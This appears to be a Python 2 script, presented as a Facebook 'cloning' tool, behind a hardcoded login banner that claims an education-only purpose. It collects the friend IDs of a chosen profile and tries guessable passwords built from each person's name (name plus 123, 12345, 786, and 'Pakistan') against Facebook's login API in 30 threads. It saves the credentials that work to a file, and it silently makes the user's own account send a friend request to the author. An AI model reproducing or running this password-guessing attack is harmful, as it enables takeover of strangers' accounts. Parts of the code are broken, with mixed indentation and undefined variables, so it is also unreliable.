#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To AHMAD SANA FAROOQ
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

logo = """

                 \033[1;93m_____________________________________________
                \033[1;93m|.'',        \033[1;97mSTAY SAFE AT HOME            \033[1;93m,''.|
                \033[1;93m|.'.'',          \033[1;97mWEAR MASK              \033[1;93m,''.'.|
                \033[1;93m|.'.'.'',         \033[1;97mWASH HAND           \033[1;93m,''.'.'.|
                \033[1;93m|.'.'.'.'',                         ,''.'.'.'.|
                \033[1;93m|.'.'.'.'.|                         |.'.'.'.'.|
                \033[1;93m|.'.'.'.'.|===;                 ;===|.'.'.'.'.|
                \033[1;93m|.'.'.'.'.|:::|',             ,'|:::|.'.'.'.'.|
                \033[1;93m|.'.'.'.'.|---|'.|, _______ ,|.'|---|.'.'.'.'.|
                \033[1;93m|.'.'.'.'.|:::|'.|'|???????|'|.'|:::|.'.'.'.'.|
                \033[1;93m|,',',',',|---|',|'|???????|'|,'|---|,',',',',|
                \033[1;93m|.'.'.'.'.|:::|'.|'|???????|'|.'|:::|.'.'.'.'.|
                \033[1;93m|.'.'.'.'.|---|','   /%%%\   ','|---|.'.'.'.'.|
                \033[1;93m|.'.'.'.'.|===:'    /%%%%%\    ':===|.'.'.'.'.|
                \033[1;93m|.'.'.'.'.|%%%%%%%%%%%%%%%%%%%%%%%%%|.'.'.'.'.|
                \033[1;93m|.'.'.'.','       /%%%%%%%%%\       ','.'.'.'.|
                \033[1;93m|.'.'.','        /%%%%%%%%%%%\        ','.'.'.|
                \033[1;93m|.'.','         /%%%%%%%%%%%%%\         ','.'.|
                \033[1;93m|.','          /%%%%%%%%%%%%%%%\          ','.|
                \033[1;93m|;____________/%%%%%%%%%%%%%%%%%\____________;|
 

                            \033[1;94m•╔═══════════◄░░░░░░►════════════╗•
                            \033[1;91m⚡ FACEBOOK ⚡ rdhacker      
                            \033[1;91m⚡ AUTHOR   ⚡ RdH4CK3r 
                            \033[1;91m⚡ 
			    \033[1;94m•╚════════════◄░░░░░░►════════════╝•
"""








def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print """
\033[1;96m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'               `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$  
\033[1;96m$$$$$$$$$$$$$$$$$$$$$$$$$$$$'                   `$$$$$$$$$$$$$$$$$$$$$$$$$$$$
\033[1;96m$$$'`$$$$$$$$$$$$$'`$$$$$$!                       !$$$$$$'`$$$$$$$$$$$$$'`$$$
\033[1;96m$$$$  $$$$$$$$$$$  $$$$$$$                         $$$$$$$  $$$$$$$$$$$  $$$$
\033[1;96m$$$$. `$' \' \$`  $$$$$$$!                          !$$$$$$$  '$/ `/ `$' .$$$$
\033[1;96m$$$$$. !\  i  i .$$$$$$$$                           $$$$$$$$. i  i  /! .$$$$$
\033[1;96m$$$$$$   `--`--.$$$$$$$$$                           $$$$$$$$$.--'--'   $$$$$$
\033[1;96m$$$$$$L        `$$$$$^^$$                           $$^^$$$$$'        J$$$$$$
\033[1;96m$$$$$$$.   .'   ""~   $$$    \033[1;93m$.                .$   \033[1;96m$$$   ~""   `.   .$$$$$$$
\033[1;96m$$$$$$$$.  ;      .e$$$$$!   \033[1;93m$$.             .$$   \033[1;96m!$$$$$e,      ;  .$$$$$$$$
\033[1;96m$$$$$$$$$   `.$$$$$$$$$$$$     \033[1;93m$$$.         .$$$   \033[1;96m$$$$$$$$$$$$.'   $$$$$$$$$
\033[1;96m$$$$$$$$    .$$$$$$$$$$$$$!    \033[1;93m$$`$$$$$$$$'$$     \033[1;96m!$$$$$$$$$$$$$.    $$$$$$$$
\033[1;96m$JT&yd$     $$$$$$$$$$$$$$$$.    \033[1;93m$    $$    $   \033[1;96m.$$$$$$$$$$$$$$$$     $by&TL$
                                 \033[1;93m$    $$    $
                                 \033[1;93m$.   $$   .$
                                 \033[1;93m`$        $'
                                  \033[1;93m`$$$$$$$$' 

                        \033[1;93m┍━━━━━━━━━━━━━━━━━━━✁━━━━━━━━━━━━━━━━━━━┑
                        \033[1;93m|                                       \033[1;93m|
 		        \033[1;93m| \033[1;47m\033[1;91mWE ARE ANONYMUS.THIS TOOL IS ONLY FOR\033[1;0m \033[1;93m|
		        \033[1;93m| \033[1;47m\033[1;91mEDUCATION PURPOSE.I'M NOT RESPONSIBLE\033[1;0m \033[1;93m|
		        \033[1;93m| \033[1;47m\033[1;91mFOR ANY ILLEGAL ACTIVITY.THIS CHANNEL\033[1;0m \033[1;93m| 
		        \033[1;93m| \033[1;47m\033[1;91mAND TOOL DOES NOT PORMOT  ANY ILLEGAL\033[1;0m \033[1;93m|
		        \033[1;93m|               \033[1;47m\033[1;91mACTIVITY\033[1;0m                \033[1;93m|
		        \033[1;93m┕━━━━━━━━━━━━━━━━━━━✃━━━━━━━━━━━━━━━━━━━┙
"""


CorrectUsername = "rdwn"
CorrectPassword = "rdwn"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[❖] \x1b[0;36m Enter Username\x1b[1;92m⇉ ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[❖] \x1b[0;36m Enter Password\x1b[1;92m⇉ ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username  
            loop = 'false'
        else:
            print "Wrong password!"
            os.system('xdg-open https://www.youtube.com/channel/UCv_YdNL-zlmFAGL0rqUOuvg')
    else:
        print "Wrong username!"
        os.system('xdg-open https://www.youtube.com/channel/UCv_YdNL-zlmFAGL0rqUOuvg')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print('          \033[1;97m[!!] \x1b[1;96mLogin With Fresh Account \033[1;97m[!!]' )
		jalan("\033[1;96m★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★") 
		id = raw_input('          \033[1;97m[**] \033[1;92mEnter ID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('          \033[1;97m[**] \033[1;92mEnter Password \x1b[1;91m: \x1b[1;92m')
		jalan("\033[1;96m★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★")
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mThere is no connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;36;40m[🞉] Login Done Successfully ✓ '
				os.system('xdg-open https://www.youtube.com/channel/UCv_YdNL-zlmFAGL0rqUOuvg')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91m[!] There is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;92m[!] Your Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[1;36;40m      ╔═════════════════════════════════╗"
	print "   \033[1;36;40m      ║\033[1;32;40m[《•》] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "   \033[1;36;40m      ║\033[1;32;40m[《•》] ID  \033[1;34;40m: "+id+"    \033[1;36;40m║"
	print "   \033[1;36;40m      ║\033[1;32;40m[《•》] Subs\033[1;34;40m: "+sub+"                  \033[1;36;40m║"
	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
	print "\033[1;32;98m[1] \033[1;96mStart Cloning"																														
	print "\033[1;32;98m[0] \033[1;96mLog out"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print "\033[1;96m═════════════════════ ✮❁•°♛°•❁✮ ══════════════════════\n" 
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;36;48m🞂━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🞀" 
	print "\x1b[1;32;40m[1] \033[1;33;40m⚡ From Public ID"
	print "\x1b[1;32;40m[0] \033[1;33;40m⚡ Back"
	print "\033[1;36;48m🞂━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🞀"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "!! ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━(AHMAD)━ ━ ━ ━ ━ ━ ━ ━ ━ ━━ !!\n" 
		idt = raw_input("\033[1;96m[💠]\033[1;93m Enter ID\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[💠] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[!!] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[💠] Getting ID▃ ▂ ▁ _ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "\033[1;36;96m[💠] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[💠] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[💠] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m   ▚     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m  ▞"
	print "     \033[1;36;48m⋆﹥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━﹤⋆"
	print "      \033[1;96m☆::::Checkpoint ID Open After 7 Days::::::☆"

	jalan('                    \033[1;97mStart cloning Wait...')
	print  "  \033[1;36;48m⊱ ──────────────────────────── 《∘◦☹◦∘》 ──────────────────────────── ⊰"
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '123'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;95m[  ✓  ] \x1b[1;97mClone'											
				print '\x1b[1;95m[⚡⚡] \x1b[1;95mName \x1b[1;95m    : \x1b[1;95m' + b['name']											
				print '\x1b[1;95m[⚡⚡] \x1b[1;95mID \x1b[1;95m      : \x1b[1;95m' + user											
				print '\x1b[1;95m[⚡⚡] \x1b[1;95mPassword \x1b[1;95m: \x1b[1;95m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
				    print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b ['name']
				    print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
				    print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '12345'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;95m[  ✓  ] \x1b[1;97mClone'											
				            print '\x1b[1;95m[⚡⚡] \x1b[1;95mName \x1b[1;95m    : \x1b[1;95m' + b['name']											
				            print '\x1b[1;95m[⚡⚡] \x1b[1;95mID \x1b[1;95m      : \x1b[1;95m' + user								
				            print '\x1b[1;95m[⚡⚡] \x1b[1;95mPassword \x1b[1;95m: \x1b[1;95m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
				               print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
				               print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
				               print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;95m[  ✓  ] \x1b[1;97mClone'								
						       print '\x1b[1;95m[⚡⚡] \x1b[1;95mName \x1b[1;95m    : \x1b[1;95m' + b['name']									
               					       print '\x1b[1;95m[⚡⚡] \x1b[1;95mID \x1b[1;95m      : \x1b[1;95m' + user							
						       print '\x1b[1;95m[⚡⚡] \x1b[1;95mPassword \x1b[1;95m: \x1b[1;95m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
				                           print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
				                           print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
				                           print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['last_name'] + '12345'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;95m[  ✓  ] \x1b[1;97mClone'											
				                                   print '\x1b[1;95m[⚡⚡] \x1b[1;95mName \x1b[1;95m    : \x1b[1;95m' + b['name']											
				                                   print '\x1b[1;95m[⚡⚡] \x1b[1;95mID \x1b[1;95m      : \x1b[1;95m' + user											
				                                   print '\x1b[1;95m[⚡⚡] \x1b[1;95mPassword \x1b[1;95m: \x1b[1;95m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
				                                       print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
				                                       print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
				                                       print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = b['first_name'] + '786'										
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;95m[  ✓  ] \x1b[1;97mClone'						
						                               print '\x1b[1;95m[⚡⚡] \x1b[1;95mName \x1b[1;95m    : \x1b[1;95m' + b['name']							
						                               print '\x1b[1;95m[⚡⚡] \x1b[1;95mID \x1b[1;95m      : \x1b[1;95m' + user					
						                               print '\x1b[1;95m[⚡⚡] \x1b[1;95mPassword \x1b[1;95m: \x1b[1;95m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
				                                                   print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
				                                                   print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
				                                                   print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = '786786'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;95m[  ✓  ] \x1b[1;97mClone'											
				                                                           print '\x1b[1;95m[⚡⚡] \x1b[1;95mName \x1b[1;95m    : \x1b[1;95m' + b['name']											
				                                                           print '\x1b[1;95m[⚡⚡] \x1b[1;95mID \x1b[1;95m      : \x1b[1;95m' + user									
				                                                           print '\x1b[1;95m[⚡⚡] \x1b[1;95mPassword \x1b[1;95m: \x1b[1;95m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
				                                                               print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
				                                                               print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
				                                                               print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['last_name']+'786'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;95m[  ✓  ] \x1b[1;97mClone'					
									                               print '\x1b[1;95m[⚡⚡] \x1b[1;95mName \x1b[1;95m    : \x1b[1;95m' + b['name']					
									                               print '\x1b[1;95m[⚡⚡] \x1b[1;95mID \x1b[1;95m      : \x1b[1;95m' + user				
									                               print '\x1b[1;95m[⚡⚡] \x1b[1;95mPassword \x1b[1;95m: \x1b[1;95m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
				                                                                           print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
				                                                                           print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
				                                                                           print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = 'Pakistan'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;95m[  ✓  ] \x1b[1;97mClone'											
				                                                                                   print '\x1b[1;95m[⚡⚡] \x1b[1;95mName \x1b[1;95m    : \x1b[1;95m' + b['name']											
				                                                                                   print '\x1b[1;95m[⚡⚡] \x1b[1;95mID \x1b[1;95m      : \x1b[1;95m' + user										
				                                                                                   print '\x1b[1;95m[⚡⚡] \x1b[1;95mPassword \x1b[1;95m: \x1b[1;95m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
				                                                                                       print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
				                                                                                       print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
				                                                                                       print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '123456'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;95m[  ✓  ] \x1b[1;97mClone'			
											                                       print '\x1b[1;95m[⚡⚡] \x1b[1;95mName \x1b[1;95m    : \x1b[1;95m' + b['name']			
											                                       print '\x1b[1;95m[⚡⚡] \x1b[1;95mID \x1b[1;95m      : \x1b[1;95m' + user	
											                                       print '\x1b[1;95m[⚡⚡] \x1b[1;95mPassword \x1b[1;95m: \x1b[1;95m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
				                                                                                                   print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
				                                                                                                   print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
				                                                                                                   print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;96m≫ ──────────────────── ≪•◦ ❈ ◦•≫ ──────────────────── ≪" 
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[❖] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[❖] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	print """
\033[1;97m  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
